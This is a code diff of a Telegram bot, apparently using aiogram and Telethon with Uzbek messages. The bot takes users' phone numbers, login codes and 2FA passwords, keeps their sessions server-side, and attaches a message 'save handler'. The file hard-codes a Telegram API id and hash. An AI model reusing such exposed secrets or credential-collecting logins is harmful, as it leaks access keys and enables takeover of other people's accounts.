@@ -11,8 +11,6 @@ from states.test import LoginState
 import os
 from telethon_clients import add_save_handler, clients  # Import client registry
 
-
-
 api_id = 23781985
 api_hash = '02d6562dd390823f0b0cd404ecc1e268'
 sessions_dir = "sessions"
@@ -32,9 +30,10 @@ async def ask_phone(message: types.Message, state: FSMContext):
         await message.answer("✅ Siz allaqachon tizimga kirgansiz. Session aktiv.")
 
         # Only add handler once
-        if not hasattr(client, "_save_handler_added"):
+        if user_id not in clients.keys():
             add_save_handler(client)
-            client._save_handler_added = True
+            clients[user_id]=client
+
         return
 
     markup = ReplyKeyboardMarkup(
@@ -124,10 +123,12 @@ async def handle_code_input(call: types.CallbackQuery, state: FSMContext):
         try:
             await client.sign_in(phone=phone, code=code)
             await call.message.edit_text("✅ Muvaffaqiyatli login qilindi.", reply_markup=None)
+
             # Only add handler once
-            if not hasattr(client, "_save_handler_added"):
+            user_id = call.from_user.id
+            if user_id not in clients.keys():
                 add_save_handler(client)
-                client._save_handler_added = True
+                clients[user_id] = client
 
             await state.clear()
         except SessionPasswordNeededError:
@@ -146,10 +147,12 @@ async def handle_password(message: types.Message, state: FSMContext):
         await client.sign_in(password=password)
         await message.delete()
         await message.answer("🔓 2FA muvaffaqiyatli.\n ✅ Login qilindi.")
+
         # Only add handler once
-        if not hasattr(client, "_save_handler_added"):
+        user_id = message.from_user.id
+        if user_id not in clients.keys():
             add_save_handler(client)
-            client._save_handler_added = True
+            clients[user_id] = client
 
         await state.clear()
     except Exception as e:
